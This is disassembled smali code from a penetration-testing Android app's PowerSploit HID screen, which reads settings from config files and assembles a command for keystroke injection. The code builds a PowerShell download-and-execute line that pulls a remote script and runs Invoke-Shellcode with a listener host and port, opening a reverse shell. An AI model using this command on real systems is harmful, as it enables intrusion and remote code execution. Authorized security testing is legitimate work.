.class public Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;
.super Lcom/offsec/nethunter/HidFragment;
.source "HidFragment.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/offsec/nethunter/HidFragment;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "PowerSploitFragment"
.end annotation


# instance fields
.field private configFilePath:Ljava/lang/String;

.field private configFileUrlPath:Ljava/lang/String;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lcom/offsec/nethunter/HidFragment;-><init>()V

    return-void
.end method

.method static synthetic lambda$loadOptions$0(Ljava/util/regex/Matcher;Landroid/widget/EditText;Ljava/util/regex/Matcher;Landroid/view/View;Ljava/util/regex/Matcher;Landroid/widget/EditText;Ljava/util/regex/Matcher;Landroid/widget/Spinner;)V
    .locals 2

    invoke-virtual {p0}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    invoke-virtual {p0, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p1, p0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    :cond_0
    invoke-virtual {p2}, Ljava/util/regex/Matcher;->find()Z

    move-result p0

    if-eqz p0, :cond_1

    invoke-virtual {p2, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object p0

    const p1, 0x7f0902b7

    invoke-virtual {p3, p1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/EditText;

    invoke-virtual {p1, p0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    :cond_1
    invoke-virtual {p4}, Ljava/util/regex/Matcher;->find()Z

    move-result p0

    if-eqz p0, :cond_2

    invoke-virtual {p4, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p5, p0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    :cond_2
    invoke-virtual {p6}, Ljava/util/regex/Matcher;->find()Z

    move-result p0

    if-eqz p0, :cond_3

    invoke-virtual {p6, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p7}, Landroid/widget/Spinner;->getAdapter()Landroid/widget/SpinnerAdapter;

    move-result-object p1

    check-cast p1, Landroid/widget/ArrayAdapter;

    invoke-virtual {p1, p0}, Landroid/widget/ArrayAdapter;->getPosition(Ljava/lang/Object;)I

    invoke-virtual {p1, p0}, Landroid/widget/ArrayAdapter;->getPosition(Ljava/lang/Object;)I

    move-result p0

    invoke-virtual {p7, p0}, Landroid/widget/Spinner;->setSelection(I)V

    :cond_3
    return-void
.end method

.method private loadOptions(Landroid/view/View;)V
    .locals 9

    const v0, 0x7f090372

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    move-object v4, v0

    check-cast v4, Landroid/widget/EditText;

    const v0, 0x7f090385

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    move-object v6, v0

    check-cast v6, Landroid/widget/EditText;

    const v0, 0x7f090371

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    move-object v7, v0

    check-cast v7, Landroid/widget/Spinner;

    new-instance v3, Lcom/offsec/nethunter/utils/ShellExecuter;

    invoke-direct {v3}, Lcom/offsec/nethunter/utils/ShellExecuter;-><init>()V

    new-instance v0, Ljava/lang/Thread;

    new-instance v8, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment$$ExternalSyntheticLambda1;

    move-object v1, v8

    move-object v2, p0

    move-object v5, p1

    invoke-direct/range {v1 .. v7}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment$$ExternalSyntheticLambda1;-><init>(Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;Lcom/offsec/nethunter/utils/ShellExecuter;Landroid/widget/EditText;Landroid/view/View;Landroid/widget/EditText;Landroid/widget/Spinner;)V

    invoke-direct {v0, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method synthetic lambda$loadOptions$1$com-offsec-nethunter-HidFragment$PowerSploitFragment(Lcom/offsec/nethunter/utils/ShellExecuter;Landroid/widget/EditText;Landroid/view/View;Landroid/widget/EditText;Landroid/widget/Spinner;)V
    .locals 14

    move-object v0, p0

    move-object v1, p1

    iget-object v2, v0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFileUrlPath:Ljava/lang/String;

    invoke-virtual {p1, v2}, Lcom/offsec/nethunter/utils/ShellExecuter;->ReadFile_SYNC(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, v0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFilePath:Ljava/lang/String;

    invoke-virtual {p1, v3}, Lcom/offsec/nethunter/utils/ShellExecuter;->ReadFile_SYNC(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v3, "DownloadString\\(\"(.*)\"\\)"

    const/16 v4, 0x8

    invoke-static {v3, v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v6

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    array-length v2, v1

    add-int/lit8 v2, v2, -0x1

    aget-object v1, v1, v2

    const-string v2, "-Lhost (.*) -Lport"

    invoke-static {v2, v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v8

    const-string v2, "-Lport (.*) -Force"

    invoke-static {v2, v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v10

    const-string v2, "-Payload (.*) -Lhost"

    invoke-static {v2, v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v12

    new-instance v1, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment$$ExternalSyntheticLambda0;

    move-object v5, v1

    move-object/from16 v7, p2

    move-object/from16 v9, p3

    move-object/from16 v11, p4

    move-object/from16 v13, p5

    invoke-direct/range {v5 .. v13}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment$$ExternalSyntheticLambda0;-><init>(Ljava/util/regex/Matcher;Landroid/widget/EditText;Ljava/util/regex/Matcher;Landroid/view/View;Ljava/util/regex/Matcher;Landroid/widget/EditText;Ljava/util/regex/Matcher;Landroid/widget/Spinner;)V

    move-object/from16 v2, p2

    invoke-virtual {v2, v1}, Landroid/widget/EditText;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 6

    invoke-virtual {p1}, Landroid/view/View;->getId()I

    move-result p1

    const v0, 0x7f090389

    if-ne p1, v0, :cond_1

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object p1

    if-nez p1, :cond_0

    return-void

    :cond_0
    new-instance p1, Lcom/offsec/nethunter/utils/ShellExecuter;

    invoke-direct {p1}, Lcom/offsec/nethunter/utils/ShellExecuter;-><init>()V

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v0

    const v1, 0x7f0902b7

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v1

    const v2, 0x7f090385

    invoke-virtual {v1, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/EditText;

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v2

    const v3, 0x7f090371

    invoke-virtual {v2, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/Spinner;

    invoke-virtual {v2}, Landroid/widget/Spinner;->getSelectedItem()Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getView()Landroid/view/View;

    move-result-object v3

    invoke-virtual {v3}, Landroid/view/View;->getRootView()Landroid/view/View;

    move-result-object v3

    const v4, 0x7f090372

    invoke-virtual {v3, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/EditText;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Invoke-Shellcode -Payload "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " -Lhost "

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v0, " -Lport "

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v0, " -Force"

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "iex (New-Object Net.WebClient).DownloadString(\""

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v2, "\"); "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFileUrlPath:Ljava/lang/String;

    invoke-virtual {p1, v0, v1}, Lcom/offsec/nethunter/utils/ShellExecuter;->SaveFileContents(Ljava/lang/String;Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_2

    iget-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->context:Landroid/content/Context;

    const-string v0, "Source not updated (configFileUrlPath)"

    invoke-static {p1, v0}, Lcom/offsec/nethunter/utils/NhPaths;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :cond_1
    iget-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->context:Landroid/content/Context;

    const-string v0, "Unknown click"

    invoke-static {p1, v0}, Lcom/offsec/nethunter/utils/NhPaths;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    :cond_2
    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Lcom/offsec/nethunter/HidFragment;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->getContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->context:Landroid/content/Context;

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/offsec/nethunter/utils/NhPaths;->CHROOT_PATH()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/var/www/html/powersploit-payload"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFilePath:Ljava/lang/String;

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/offsec/nethunter/utils/NhPaths;->CHROOT_PATH()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/var/www/html/powersploit-url"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->configFileUrlPath:Ljava/lang/String;

    return-void
.end method

.method public onCreateView(Landroid/view/LayoutInflater;Landroid/view/ViewGroup;Landroid/os/Bundle;)Landroid/view/View;
    .locals 1

    const p3, 0x7f0c0054

    const/4 v0, 0x0

    invoke-virtual {p1, p3, p2, v0}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;Z)Landroid/view/View;

    move-result-object p1

    const p2, 0x7f090389

    invoke-virtual {p1, p2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/Button;

    invoke-virtual {p2, p0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    invoke-direct {p0, p1}, Lcom/offsec/nethunter/HidFragment$PowerSploitFragment;->loadOptions(Landroid/view/View;)V

    return-object p1
.end method
